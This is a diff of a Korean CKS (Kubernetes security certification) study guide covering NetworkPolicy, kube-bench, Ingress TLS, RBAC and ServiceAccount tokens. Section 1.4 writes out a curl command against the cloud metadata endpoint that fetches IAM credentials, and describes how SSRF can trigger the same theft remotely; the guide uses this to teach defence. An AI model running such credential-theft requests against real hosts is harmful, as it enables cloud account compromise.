@@ -1,6 +1,26 @@
 # CKS 핵심 개념 정리
 
-CKS 시험의 6개 도메인에 해당하는 모든 핵심 개념을 정리한 문서이다. 각 도메인의 출제 비율과 세부 토픽을 체계적으로 다룬다. CKS는 쿠버네티스 자격증 중 가장 어려운 실기 시험으로, 보안 도구 생태계에 대한 깊이 있는 이해가 필수적이다.
+> 학습 목표: CKS 6개 도메인의 핵심 개념과 실습 패턴을 이 문서만으로 이해·재현한다 | 도메인·비중: Cluster Setup 10% · Cluster Hardening 15% · System Hardening 15% · Minimize Microservice Vulnerabilities 20% · Supply Chain Security 20% · Monitoring·Logging·Runtime Security 20% | 예상 소요: 통독 4~5시간(실습 별도)
+
+CKS 시험의 6개 도메인에 해당하는 모든 핵심 개념을 정리한 문서이다. 각 도메인의 출제 비율과 세부 토픽을 체계적으로 다룬다. CKS는 쿠버네티스 자격증 중 가장 어려운 실기 시험으로, 보안 도구 생태계에 대한 깊이 있는 이해가 필수적이다. 선수과목은 CKA이며, RBAC·스케줄링·etcd 등 CKA 개념을 전제한다.
+
+## 실습 전 필수 셋업
+
+CKS는 제한 시간(120분) 안에 15~20문제를 푸는 속도전이다. 매 문제 `kubectl`을 그대로 치면 시간이 부족하므로, 시험 시작 직후 다음 단축 설정을 한 번 잡아 두고 시작한다. (아래는 입력 명령 예시이며, 시험 환경의 bash에 그대로 붙여 넣는다.)
+
+```bash
+# kubectl 단축 alias
+alias k=kubectl
+# 매니페스트 골격을 빠르게 뽑는 dry-run 옵션
+export do='--dry-run=client -o yaml'
+# 삭제 즉시 적용(graceful 대기 생략)
+export now='--force --grace-period=0'
+# k 에도 bash 자동완성 적용
+source <(kubectl completion bash)
+complete -o default -F __start_kubectl k
+```
+
+이 문서의 실습 명령은 이 저장소의 tart 클러스터에서 검증한다. kubeconfig 경로는 `~/sideproejct/IaC_apple_sillicon/kubeconfig/<클러스터>.yaml`이며, CKS 파괴 실습은 dev/staging 클러스터에서만 한다(platform/prod 금지). 노드에 SSH로 들어가는 실습(AppArmor·seccomp·Falco 등)은 VM 별칭(예: `ssh dev-master`)으로 접속한다(`~/.ssh/config`에 등록된 별칭, 비밀번호 없이 접속).
 
 ---
 
@@ -11,6 +31,10 @@ CKS 시험의 6개 도메인에 해당하는 모든 핵심 개념을 정리한 �
 ### 1.1 NetworkPolicy로 클러스터 접근 제어
 
 NetworkPolicy는 Pod 간 네트워크 트래픽을 제어하는 쿠버네티스 리소스이다. CKS에서 가장 빈번하게 출제되는 주제 중 하나이다.
+
+**등장 배경: flat 네트워크의 위협과 직전 해결책의 한계:**
+
+쿠버네티스의 기본 네트워크 모델은 "모든 Pod가 NAT 없이 서로 직접 통신할 수 있다"는 flat 네트워크다(같은 클러스터의 어떤 Pod든 다른 Pod의 IP로 곧장 패킷을 보낼 수 있다). 이 모델은 개발 편의는 높지만 보안 관점에서는 위협이다. 프런트엔드 Pod 하나가 침해되면, 공격자는 그 Pod에서 데이터베이스 Pod·내부 관리 API 등 클러스터 안의 모든 Pod로 자유롭게 횡적 이동(lateral movement)할 수 있다. 즉 침해 1건이 클러스터 전체로 번진다. NetworkPolicy가 없던 시절의 직전 해결책은 노드마다 관리자가 iptables 규칙을 손으로 작성해 트래픽을 막는 것이었는데, Pod IP가 스케줄링·재시작마다 바뀌고 노드가 수십 대로 늘면 규칙을 사람이 일관되게 유지하기가 사실상 불가능했다. NetworkPolicy는 이 문제를 "Pod를 IP가 아니라 라벨로 지목하고, 허용 규칙을 선언적 매니페스트로 적으면 CNI가 각 노드에 자동 반영"하는 방식으로 해결한다.
 
 **동작 원리:**
 
@@ -76,44 +100,90 @@ spec:
       port: 53
 ```
 
-**실습 검증: NetworkPolicy 적용 후 트래픽 차단 확인**
+**실습 검증: NetworkPolicy의 누적(AND) 효과 단계별 확인**
 
-default deny all 정책을 적용한 뒤, 실제 트래픽이 차단되는지 검증한다:
+전제 조건: CKS 파괴 실습은 dev/staging 클러스터에서만 수행한다(§3 표). NetworkPolicy를 실제로 강제하는 CNI(Calico/Cilium)가 깔린 클러스터여야 하며, 이 저장소의 dev/staging은 Cilium을 사용하므로 적합하다. 명령에는 항상 대상 클러스터의 kubeconfig(`~/sideproejct/IaC_apple_sillicon/kubeconfig/dev.yaml`)와 네임스페이스를 명시한다.
+
+NetworkPolicy는 "여러 정책의 허용 규칙이 합집합(OR)으로 누적되지만, 한 Pod에 Egress 정책이 하나라도 걸리면 명시되지 않은 모든 아웃바운드는 차단(default deny)"되는 구조이다. 이 때문에 default deny를 건 뒤에는 DNS와 목적지 포트를 각각 허용해 줘야 통신이 복구된다. 아래 흐름으로 이 누적 효과를 단계적으로 검증한다.
 
 ```bash
-# 1. 테스트 네임스페이스와 Pod 생성
-kubectl create namespace netpol-test
-kubectl run server --namespace=netpol-test --image=nginx --port=80
-kubectl expose pod server --namespace=netpol-test --port=80
+# 별칭 가정: k=kubectl, 모든 명령에 --kubeconfig 와 -n netpol-test 명시
+KC=~/sideproejct/IaC_apple_sillicon/kubeconfig/dev.yaml
 
-# 2. 정책 적용 전: 통신 가능 확인
-kubectl run client --namespace=netpol-test --rm -it --image=busybox --restart=Never -- wget -qO- --timeout=3 http://server
+# 1. 테스트 네임스페이스와 server Pod 생성 (선행 리소스)
+kubectl --kubeconfig=$KC create namespace netpol-test
+kubectl --kubeconfig=$KC -n netpol-test run server --image=nginx --port=80
+kubectl --kubeconfig=$KC -n netpol-test expose pod server --port=80
+kubectl --kubeconfig=$KC -n netpol-test wait --for=condition=Ready pod/server --timeout=60s
+
+# 2. 정책 적용 전: 통신 가능 확인 (DNS 해석 + HTTP 모두 성공해야 함)
+kubectl --kubeconfig=$KC -n netpol-test run client --rm -it --image=busybox --restart=Never -- wget -qO- --timeout=3 http://server
 
 # 3. default deny all 정책 적용
-kubectl apply -f default-deny-all.yaml
+kubectl --kubeconfig=$KC apply -f default-deny-all.yaml
 
-# 4. 정책 적용 후: 통신 차단 확인
-kubectl run client --namespace=netpol-test --rm -it --image=busybox --restart=Never -- wget -qO- --timeout=3 http://server
+# 4. 정책 적용 후: 통신 차단 확인 (DNS 조차 막혀 server 이름 해석 실패)
+kubectl --kubeconfig=$KC -n netpol-test run client --rm -it --image=busybox --restart=Never -- wget -qO- --timeout=3 http://server
+
+# 5. DNS 트래픽 허용 정책 추가 적용 (포트 53 egress 허용)
+kubectl --kubeconfig=$KC apply -f allow-dns.yaml
+
+# 6. DNS 해석만 복구되었는지 확인 (이름은 풀리지만 HTTP 80 은 여전히 막힘)
+kubectl --kubeconfig=$KC -n netpol-test run client --rm -it --image=busybox --restart=Never -- nslookup server
+
+# 7. server 로의 HTTP 80 egress 를 허용하는 정책 추가
+kubectl --kubeconfig=$KC apply -f allow-http-to-server.yaml
+
+# 8. 다시 HTTP 통신 성공 확인 (DNS 허용 + HTTP 허용이 모두 누적되어야 통함)
+kubectl --kubeconfig=$KC -n netpol-test run client --rm -it --image=busybox --restart=Never -- wget -qO- --timeout=3 http://server
 ```
 
-기대 출력 (정책 적용 전):
-```text
-<!DOCTYPE html>
-<html>
-<head>
-<title>Welcome to nginx!</title>
-...
+7단계에서 적용하는 server 대상 HTTP egress 허용 정책은 다음과 같다(client Pod 에 `app=client` 라벨을 붙여 대상을 좁힌다):
+```yaml
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: allow-http-to-server
+  namespace: netpol-test
+spec:
+  podSelector: {}
+  policyTypes:
+  - Egress
+  egress:
+  - to:
+    - podSelector:
+        matchLabels:
+          run: server
+    ports:
+    - protocol: TCP
+      port: 80
 ```
 
-기대 출력 (정책 적용 후):
-```text
-wget: download timed out
-command terminated with exit code 1
-```
+기대 출력 (2단계, 정책 적용 전 — DNS·HTTP 모두 성공):
+![서비스 HTTP 응답(nginx)](images/cks-html.png)
+
+기대 출력 (4단계, default deny 적용 후 — DNS 해석 단계부터 실패):
+![NetworkPolicy egress 차단 — DNS 실패](images/cks-np-deny.png)
+
+기대 출력 (6단계, DNS 허용 후 — 이름은 풀리지만 HTTP 는 아직 차단):
+> **예시(참조) — Server:		10.96.0.10:** CKS 보안 기대 출력(도구/설정/환경 의존). 재현 가능한 핵심은 CKS daily(day01~14) 및 본 문서 캡처 참고.
+
+기대 출력 (8단계, HTTP egress 까지 허용 — 통신 재개):
+![서비스 HTTP 응답(nginx)](images/cks-html.png)
+
+이 흐름은 "Egress 정책이 걸린 순간 DNS(53)부터 막히고, DNS를 허용해도 목적지 포트(80)를 따로 열기 전까지는 통신이 안 된다"는 NetworkPolicy의 누적 차단을 몸으로 보여준다. 4단계 출력이 `download timed out`이 아니라 `bad address`로 바뀌는 이유는, busybox의 wget이 호스트명 해석(DNS) 단계에서 먼저 실패하기 때문이다. DNS 허용을 빠뜨리면 거의 모든 실습이 이 지점에서 막히므로, default deny 다음에는 항상 DNS 허용을 먼저 추가하는 습관을 들인다.
 
 ### 1.2 CIS Benchmark (kube-bench)
 
 CIS(Center for Internet Security) Benchmark는 쿠버네티스 클러스터의 보안 설정을 점검하는 표준 가이드라인이다. kube-bench는 CIS Benchmark를 자동으로 점검하는 도구이다.
+
+**등장 배경: 수작업 점검의 한계:**
+
+CIS Benchmark는 수백 개의 점검 항목(API server 플래그, kubelet 설정, 파일 권한 등)으로 이루어진 문서다. 이를 사람이 직접 점검하려면 각 노드에 들어가 설정 파일과 프로세스 인자를 일일이 읽고 기준값과 대조해야 하는데, 항목 수가 많고 쿠버네티스 버전마다 권장값이 달라 누락·오판이 잦았다. 또 클러스터를 업그레이드하거나 매니페스트를 고칠 때마다 전체를 다시 점검해야 하므로 수작업으로는 반복 점검이 현실적이지 않았다. kube-bench는 이 점검을 코드로 자동화해, 한 번의 실행으로 모든 항목을 PASS/FAIL/WARN으로 판정하고 버전별 기준 파일을 자동 선택한다.
+
+**CKS 시험 환경에서의 실행:**
+
+CKS 시험에서는 kube-bench 바이너리가 노드에 이미 설치돼 있거나, kube-bench를 실행하는 Job/Pod 매니페스트가 제공되는 형태로 출제된다. 따라서 직접 설치할 필요는 없고, 문제에 안내된 방식(바이너리 직접 실행 또는 `kubectl apply`로 Job 배포 후 로그 확인)으로 실행한다. 이 저장소의 tart 노드에는 기본적으로 kube-bench가 없으므로, 직접 실습하려면 노드에 접속(예: `ssh dev-master` — `~/.ssh/config`에 등록된 VM 별칭, 비밀번호 없이 접속)해 바이너리를 내려받거나 공식 Job 매니페스트(`kubectl apply -f job.yaml` 후 `kubectl logs job/kube-bench`)로 실행한다.
 
 **동작 원리:**
 
@@ -163,25 +233,7 @@ kube-bench run --targets master 2>&1 | head -50
 ```
 
 기대 출력 (FAIL 항목 예시):
-```text
-[INFO] 1 Master Node Security Configuration
-[INFO] 1.2 API Server
-[PASS] 1.2.1 Ensure that the --anonymous-auth argument is set to false
-[FAIL] 1.2.2 Ensure that the --basic-auth-file argument is not set
-[PASS] 1.2.3 Ensure that the --token-auth-file parameter is not set
-...
-
-== Remediations master ==
-1.2.2 Follow the documentation and configure alternate mechanisms for authentication.
-Then, edit the API server pod specification file /etc/kubernetes/manifests/kube-apiserver.yaml
-on the control plane node and remove the --basic-auth-file=<filename> parameter.
-
-== Summary master ==
-45 checks PASS
-2 checks FAIL
-10 checks WARN
-0 checks INFO
-```
+> **예시(참조) — kube-bench CIS 점검 — PASS(준수):** [INFO] 1 Master Node Security Configuration ... (도구/설정 의존, 해당 도구 설치·구성 환경에서 재현).
 
 FAIL 항목 수정 후 재검증:
 ```bash
@@ -195,9 +247,7 @@ kube-bench run --targets master --check 1.2.2
 ```
 
 기대 출력 (수정 후):
-```text
-[PASS] 1.2.2 Ensure that the --basic-auth-file argument is not set
-```
+> **예시(참조) — kube-bench CIS 점검 — PASS(준수):** [PASS] 1.2.2 Ensure that the --basic-auth-file a ... (도구/설정 의존, 해당 도구 설치·구성 환경에서 재현).
 
 **CKS 시험에서의 활용:**
 - kube-bench를 실행하고 실패한 항목을 수정하는 문제가 출제된다
@@ -206,7 +256,11 @@ kube-bench run --targets master --check 1.2.2
 
 ### 1.3 Ingress TLS 설정
 
-Ingress 리소스에 TLS를 적용하여 외부 트래픽을 암호화하는 설정이다.
+Ingress 리소스에 TLS를 적용하여 외부 트래픽을 암호화하는 설정이다. (앞 1.2에서 노드/컴포넌트 자체의 설정을 점검했다면, 여기서는 클러스터 외부로 나가는 입구의 트래픽 암호화를 다룬다.)
+
+**등장 배경: 평문 HTTP 노출 문제와 직전 방식의 한계:**
+
+쿠버네티스에서 서비스를 외부로 노출하는 직전 방식은 NodePort(노드의 고정 포트를 모든 노드에서 여는 방식)나 LoadBalancer(클라우드 L4 로드밸런서 할당)였다. 두 방식 모두 L4(전송 계층)에서 트래픽을 그대로 전달할 뿐 암호화를 책임지지 않으므로, 애플리케이션이 평문 HTTP로 노출되면 사용자 인증 토큰·세션 쿠키·요청 본문이 네트워크 경로에서 그대로 도청(sniffing)될 수 있었다. 또 서비스마다 별도의 외부 IP·포트가 필요해 TLS 종료(TLS termination, 암호화된 연결을 복호화해 평문으로 백엔드에 전달하는 지점)를 서비스 개수만큼 중복 구성해야 했다. Ingress는 L7(애플리케이션 계층) 라우팅 지점을 한 곳으로 모아 호스트/경로 기반으로 여러 서비스를 분기하고, 그 입구에서 TLS를 한 번에 종료한다. 인증서·키를 `kubernetes.io/tls` 타입 Secret으로 선언하면 Ingress 컨트롤러가 이를 로드해 외부 구간을 HTTPS로 강제한다. 트레이드오프로는 TLS 종료가 Ingress 컨트롤러에서 일어나므로 컨트롤러부터 백엔드 Pod까지의 클러스터 내부 구간은 별도 설정(예: mTLS·서비스 메시) 없이는 다시 평문이 되며, 인증서 만료·갱신을 운영자가 관리해야 한다는 점이 있다.
 
 **설정 절차:**
 1. TLS 인증서와 키를 생성한다 (또는 기존 것을 사용한다)
@@ -252,13 +306,47 @@ spec:
 - `spec.tls[].hosts`에 TLS를 적용할 호스트명을 지정한다
 - TLS Secret은 Ingress와 같은 네임스페이스에 있어야 한다
 
+**실습 검증: TLS Secret과 핸드셰이크 확인**
+
+전제: 이 검증의 1~2단계(Secret·인증서 확인)는 Ingress controller 없이도 가능하지만, 3단계 이후의 실제 HTTPS 핸드셰이크 확인은 클러스터에 Ingress controller(예: ingress-nginx)가 설치돼 있어야 한다. 이 저장소의 dev/staging 클러스터에는 Ingress controller가 기본 설치돼 있지 않으므로, controller가 없으면 3단계 이후는 controller 설치 후에만 재현 가능하다(없으면 결과를 "(미설치)"로 표기한다).
+
+```bash
+# kubeconfig 별칭 (dev 클러스터, 파괴 실습은 dev/staging 에서만 — §3 표)
+KC=~/sideproejct/IaC_apple_sillicon/kubeconfig/dev.yaml
+
+# 1. TLS Secret 이 생성됐고 타입이 kubernetes.io/tls 인지 확인
+kubectl --kubeconfig=$KC get secret myapp-tls -o jsonpath='{.type}'; echo
+kubectl --kubeconfig=$KC get secret myapp-tls -o jsonpath='{.data}' | grep -o 'tls.crt\|tls.key'
+
+# 2. Secret 에 담긴 인증서의 CN(주체 이름)과 유효기간 확인
+kubectl --kubeconfig=$KC get secret myapp-tls -o jsonpath='{.data.tls\.crt}' \
+  | base64 -d | openssl x509 -noout -subject -dates
+
+# 3. Ingress 의 외부 주소(또는 controller Service 의 IP) 확인
+kubectl --kubeconfig=$KC get ingress myapp-ingress
+
+# 4. curl 로 TLS 핸드셰이크와 서버 인증서 확인
+#    -k: 자체서명 인증서 검증 생략, --resolve: 호스트명을 Ingress IP 로 강제 매핑
+curl -vk --resolve myapp.example.com:443:<INGRESS_IP> https://myapp.example.com/ 2>&1 | head -25
+```
+
+2단계에서 `subject=CN = myapp.example.com`이 보이면 Secret이 의도한 인증서를 담고 있다는 뜻이고, 4단계의 `-v` 출력에서 `SSL connection using TLSv1.3` 같은 핸드셰이크 줄과 `subject: CN=myapp.example.com` 인증서 정보가 나오면 Ingress가 그 Secret을 종단(termination)에 사용하고 있다는 신호다. (controller 미설치 환경에서는 4단계 출력 미캡처)
+
 ### 1.4 노드 메타데이터 보호
 
 클라우드 환경(AWS, GCP, Azure)에서 실행되는 쿠버네티스 노드는 클라우드 인스턴스 메타데이터 API에 접근할 수 있다. 이 메타데이터에는 IAM 자격 증명, 네트워크 설정 등 민감한 정보가 포함되어 있으므로 Pod에서의 접근을 차단해야 한다.
 
 **공격 시나리오:**
 
-컨테이너 내부에서 `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/` 요청을 보내면 노드에 할당된 IAM 역할의 임시 자격 증명(Access Key, Secret Key, Session Token)을 탈취할 수 있다. 이를 통해 S3 버킷 접근, EC2 인스턴스 조작 등 클라우드 리소스에 대한 권한 상승 공격이 가능하다. 이 공격은 SSRF(Server-Side Request Forgery) 취약점과 결합되면 외부 공격자에 의해서도 트리거될 수 있다.
+컨테이너 내부에서 `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/` 요청을 보내면 노드에 할당된 IAM 역할의 임시 자격 증명(Access Key, Secret Key, Session Token)을 탈취할 수 있다. 이를 통해 S3 버킷 접근, EC2 인스턴스 조작 등 클라우드 리소스에 대한 권한 상승 공격이 가능하다.
+
+위 `curl` 호출은 이미 컨테이너 내부에 침입한 공격자(예: RCE로 셸을 획득한 상태)가 직접 명령을 실행하는 경우다. 그러나 셸이 없어도, 애플리케이션이 가진 SSRF(Server-Side Request Forgery, 서버가 외부 입력으로 받은 URL을 대신 fetch하도록 유도하는 취약점) 결함을 악용하면 외부 공격자가 같은 결과를 얻을 수 있다. SSRF 공격의 흐름은 다음 단계로 진행된다:
+
+1. 웹 애플리케이션이 사용자 입력 URL을 검증 없이 서버 측에서 fetch하는 기능을 노출한다(예: "이미지 URL을 넣으면 미리보기를 만들어 줌").
+2. 공격자가 그 입력 칸에 정상 URL 대신 클라우드 메타데이터 주소 `http://169.254.169.254/latest/meta-data/iam/security-credentials/`를 넣는다.
+3. 애플리케이션 서버(Pod)가 그 URL을 그대로 fetch하여 메타데이터 응답을 받아 화면이나 응답 본문에 노출한다. 결과적으로 IAM 자격 증명이 외부 공격자에게 전달된다.
+
+즉, 단순 `curl`은 "내부에 이미 들어온 공격자가 메타데이터에 접근하는 것"이고, SSRF는 "외부 공격자가 애플리케이션의 URL fetch 기능을 디딤돌 삼아 같은 접근을 원격에서 트리거하는 기법"이라는 점에서 구분된다. NetworkPolicy로 메타데이터 대역을 egress 차단하면 두 경로 모두 막을 수 있다.
 
 **클라우드별 메타데이터 엔드포인트:**
 - AWS: `http://169.254.169.254/latest/meta-data/`
@@ -292,14 +380,15 @@ kubectl run test --rm -it --image=busybox --restart=Never -- wget -qO- --timeout
 ```
 
 기대 출력:
-```text
-wget: download timed out
-command terminated with exit code 1
-```
+![NetworkPolicy 차단 — wget timeout](images/cks-np-deny.png)
 
 ### 1.5 Dashboard 보안, GUI 접근 제한
 
 Kubernetes Dashboard는 웹 기반 UI로, 보안 설정이 미흡하면 심각한 보안 위협이 된다. 2018년 Tesla 클라우드 침해 사건에서 인터넷에 노출된 Kubernetes Dashboard를 통해 공격자가 클러스터 전체를 장악한 사례가 있다.
+
+**등장 배경: 인증 없는 GUI 입구의 위협:**
+
+초기 Dashboard 배포 가이드는 사용 편의를 위해 인증을 건너뛰는 `--enable-skip-login`을 허용하고, Dashboard의 ServiceAccount에 `cluster-admin`(클러스터 전체 관리자 권한)을 손쉽게 바인딩하는 형태가 흔했다. Tesla 사건이 보여준 문제가 바로 이 조합이다. 인증 없이 접근 가능한 Dashboard가 NodePort/LoadBalancer로 공인망에 노출되면, 누구든 그 GUI를 거쳐 cluster-admin 권한으로 클러스터를 조작할 수 있다(공격자는 Tesla 사례에서 그 권한으로 암호화폐 채굴 컨테이너를 띄웠다). 현재 권고는 이 한계를 두 축으로 보완한다. 첫째, 노출면을 줄여 Dashboard를 공인망에 직접 노출하지 않고 `kubectl proxy`를 통해 로컬에서만 접근한다. 둘째, 권한을 최소화해 토큰 기반 로그인을 강제(skip-login 제거)하고 ServiceAccount에 필요한 최소 권한만 부여한다. 트레이드오프로는 매번 `kubectl proxy`를 띄우고 토큰을 발급·입력해야 하므로 즉시 접근 편의가 줄고, RBAC을 세밀하게 짜는 운영 비용이 늘어난다.
 
 **보안 권장사항:**
 - Dashboard를 인터넷에 직접 노출하지 않아야 한다
@@ -330,16 +419,13 @@ echo "$(cat kubelet.sha512)  /usr/bin/kubelet" | sha512sum --check
 echo "$(cat kubelet.sha512)  /usr/bin/kubelet" | sha512sum --check
 ```
 
-기대 출력 (정상):
-```text
-/usr/bin/kubelet: OK
-```
+정상 케이스와 변조 케이스는 `sha512sum --check`의 마지막 줄 표시로 구분한다. 해시가 일치하면 `/usr/bin/kubelet: OK`가 출력되고 종료 코드는 0이다. 한 바이트라도 다르면 `/usr/bin/kubelet: FAILED`와 함께 `sha512sum: WARNING: 1 computed checksum did NOT match` 경고가 출력되고 종료 코드는 1이 된다. 즉 두 상태는 같은 화면이 아니라 끝줄의 `OK`/`FAILED` 토큰과 종료 코드로 명확히 갈린다.
 
-기대 출력 (변조됨):
-```text
-/usr/bin/kubelet: FAILED
-sha512sum: WARNING: 1 computed checksum did NOT match
-```
+기대 출력 (정상 — `OK`, 종료 코드 0):
+![바이너리 무결성 sha512sum OK](images/cks-checksum.png)
+
+기대 출력 (변조됨 — `FAILED` + `did NOT match` 경고, 종료 코드 1):
+![체크섬 불일치 — 변조 탐지](images/cks-checksum.png)
 
 **CKS 시험에서의 활용:**
 - 특정 바이너리가 변조되었는지 확인하는 문제가 출제된다
@@ -360,7 +446,9 @@ RBAC(Role-Based Access Control)은 쿠버네티스에서 인증된 사용자/서
 
 API server에 요청이 도달하면 다음 순서로 처리된다:
 1. **인증(Authentication)**: 요청자가 누구인지 확인한다. X.509 클라이언트 인증서, Bearer Token, OIDC Token 등의 방식이 있다. 인증에 실패하면 401 Unauthorized를 반환한다.
-2. **인가(Authorization)**: 인증된 사용자가 해당 작업을 수행할 권한이 있는지 확인한다. `--authorization-mode` 플래그에 지정된 모드(Node, RBAC, Webhook 등)가 순서대로 평가된다. 하나의 모드에서 허용되면 이후 모드는 평가하지 않는다. 모든 모드에서 거부되면 403 Forbidden을 반환한다.
+2. **인가(Authorization)**: 인증된 사용자가 해당 작업을 수행할 권한이 있는지 확인한다. API server는 `--authorization-mode` 플래그에 나열된 순서대로 각 모드(예: `Node,RBAC,Webhook`)를 평가한다. 평가 규칙은 "첫 번째 명시적 allow에서 멈춤"이다 — 어떤 모드가 `allow`를 반환하면 즉시 요청을 허용하고 뒤의 모드는 보지 않는다. 어떤 모드도 명시적 `allow`를 반환하지 않거나 모든 모드가 `deny`를 반환하면 403 Forbidden이다. 여기서 각 모드의 "no opinion"(해당 요청에 대해 판단하지 않음)은 거부가 아니라 "다음 모드로 넘김"을 의미한다는 점이 중요하다.
+
+   - **Node 인가 모드**: kubelet이 보내는 요청 전용 모드로, 각 kubelet이 자기 노드와 그 노드에서 실행 중인 Pod에 관련된 리소스(해당 노드에 마운트된 Secret/ConfigMap, 자기 노드 객체 등)만 읽고 쓸 수 있도록 제한한다. 보통 `Node,RBAC` 순서로 두어, kubelet 요청은 Node 모드가 먼저 판정하고, 일반 사용자/SA 요청은 Node 모드가 no opinion을 반환하므로 RBAC이 이어서 판정한다.
 3. **Admission Control**: 요청의 내용을 검증하거나 변형한다 (후술).
 
 **RBAC 4가지 리소스:**
@@ -406,21 +494,12 @@ kubectl auth can-i '*' '*' --as=system:serviceaccount:kube-system:default
 ```
 
 기대 출력 (`can-i` 명령):
-```text
-yes
-```
+> **예시(참조) — yes:** CKS 보안 기대 출력(도구/설정/환경 의존). 재현 가능한 핵심은 CKS daily(day01~14) 및 본 문서 캡처 참고.
 또는:
-```text
-no
-```
+> **예시(참조) — no:** CKS 보안 기대 출력(도구/설정/환경 의존). 재현 가능한 핵심은 CKS daily(day01~14) 및 본 문서 캡처 참고.
 
 기대 출력 (`can-i --list` 명령):
-```text
-Resources                                       Non-Resource URLs   Resource Names   Verbs
-selfsubjectaccessreviews.authorization.k8s.io   []                  []               [create]
-selfsubjectrulesreviews.authorization.k8s.io    []                  []               [create]
-pods                                            []                  []               [get list watch]
-```
+![auth can-i --list — 기본 권한](images/cks-rbac-list.png)
 
 ### 2.2 ServiceAccount 보안
 
@@ -445,7 +524,10 @@ Pod에 자동 마운트된 ServiceAccount 토큰(`/var/run/secrets/kubernetes.io
 3. **TokenRequestAPI 사용 (Bound Service Account Token)**
    - K8s 1.22+에서는 시간 제한이 있는 바운드 토큰이 기본으로 사용된다
    - projected volume으로 토큰의 만료 시간과 audience를 설정할 수 있다
-   - 만료 시간이 없는 시크릿 기반 토큰보다 안전하다. 시크릿 기반 토큰은 명시적으로 삭제하기 전까지 영구적으로 유효하므로, 토큰이 유출되면 장기간 악용될 수 있다
+
+   **전환 배경 — 시크릿 기반 토큰의 한계:** K8s 1.21 이하에서는 ServiceAccount를 만들면 그 토큰이 별도의 Secret 오브젝트에 저장되고, Pod에 그 Secret이 그대로 마운트됐다. 이 토큰은 만료 시간(`exp` 클레임)이 없어 한 번 발급되면 무기한 유효했고, 특정 audience(수신 대상)에 묶이지도 않아 어떤 서비스에든 그대로 쓸 수 있었다. 문제는 토큰이 유출됐을 때다. 만료가 없으므로 공격자가 토큰을 손에 넣으면 영구적으로 API server에 접근할 수 있고, 토큰 값을 바꾸지 않는 한 개별 revoke(무효화)할 방법도 없어 ServiceAccount 자체를 지우는 것 외에 차단 수단이 없었다.
+
+   **무엇이 나아졌나 — Bound Token:** 1.22+의 Bound Service Account Token은 TokenRequest API로 동적 발급되며 ⓐ 만료 시간이 있어(기본 1시간) 유출돼도 곧 무효가 되고, ⓑ audience가 지정돼 의도한 수신자에게만 유효하며, ⓒ 특정 Pod(객체)에 바인딩돼 그 Pod가 삭제되면 함께 무효화되고, ⓓ kubelet이 projected volume의 토큰을 만료 전에 자동 갱신한다. 트레이드오프로, 토큰이 수명이 짧아졌으므로 클라이언트는 파일에서 토큰을 재읽기하도록 만들어야 하며(메모리에 한 번 캐시하고 재사용하면 만료 후 401을 받는다), 이는 옛 SDK·스크립트 호환성에 영향을 줄 수 있다.
 
 **실습 검증: 토큰 마운트 비활성화 확인**
 
@@ -455,10 +537,7 @@ kubectl exec -it no-token-pod -- ls /var/run/secrets/kubernetes.io/serviceaccoun
 ```
 
 기대 출력:
-```text
-ls: /var/run/secrets/kubernetes.io/serviceaccount/: No such file or directory
-command terminated with exit code 1
-```
+![automount=false — SA 토큰 디렉토리 없음](images/cks-notoken.png)
 
 ```bash
 # 2. 토큰이 마운트된 Pod에서 토큰 확인 (비교)
@@ -466,9 +545,7 @@ kubectl exec -it normal-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount
 ```
 
 기대 출력:
-```text
-eyJhbGciOiJSUzI1NiIsImtpZCI6Ijk....(JWT 토큰)
-```
+![SA 토큰(JWT) payload 디코드](images/cks-jwt.png)
 
 ### 2.3 API Server 접근 제한
 
@@ -522,6 +599,10 @@ kubectl get nodes
 
 쿠버네티스는 주기적으로 보안 패치를 포함한 업데이트를 릴리스한다. 최신 보안 패치를 적용하기 위해 클러스터를 업그레이드하는 방법을 알아야 한다.
 
+**등장 배경: n-day 취약점과 수동 패치의 한계:**
+
+쿠버네티스 컴포넌트(API server·kubelet 등)에서 CVE(공개된 취약점 식별번호)가 공표되면, 그 시점부터 공격자가 해당 취약점을 노릴 수 있는 n-day 취약점(공개되어 있으나 아직 패치하지 않아 노출된 취약점) 상태가 된다. 즉 패치가 나온 뒤에도 클러스터를 올리지 않으면 위험 창(window of exposure)이 계속 열려 있다. 업그레이드 도구가 없던 시절의 직전 방식은 운영자가 각 노드에 SSH로 들어가 바이너리를 손으로 교체하고 인증서·kubeconfig·컴포넌트 설정을 직접 맞추는 수동 패치였다. 이 방식은 노드마다 적용 순서·버전이 어긋나기 쉬워(컨트롤 플레인은 1.29인데 일부 kubelet은 1.27 등) skew 정책 위반과 일관성 문제를 일으켰고, 작업 중 정족수(etcd quorum)나 인증서를 잘못 건드리면 클러스터 전체가 멈췄다. `kubeadm upgrade`는 이 과정을 "plan으로 적용 가능 버전을 점검 → apply가 컨트롤 플레인 컴포넌트와 인증서·정적 파드 매니페스트를 일괄 교체 → 노드별로 drain·kubelet 교체·uncordon"이라는 정해진 순서로 자동화해, 사람이 빠뜨리던 단계와 버전 skew를 줄인다. 트레이드오프로는 한 번에 한 마이너 버전씩만 올릴 수 있어(버전 skew 정책 때문) 여러 버전을 건너뛰지 못하고, drain 과정에서 워크로드가 재스케줄링되는 동안 일시적 가용성 저하가 발생하며, 업그레이드 자체가 실패하면 복구를 위해 사전 etcd 백업이 사실상 필수라는 점이 있다.
+
 **kubeadm 업그레이드 절차:**
 ```bash
 # 1. 업그레이드 가능 버전 확인
@@ -552,6 +633,10 @@ kubectl uncordon <node-name>
 ### 2.5 kubeconfig 보안 관리
 
 kubeconfig 파일은 클러스터 접근 자격 증명을 포함하고 있으므로 보안 관리가 중요하다.
+
+**등장 배경: 평문 자격 증명 파일의 위협:**
+
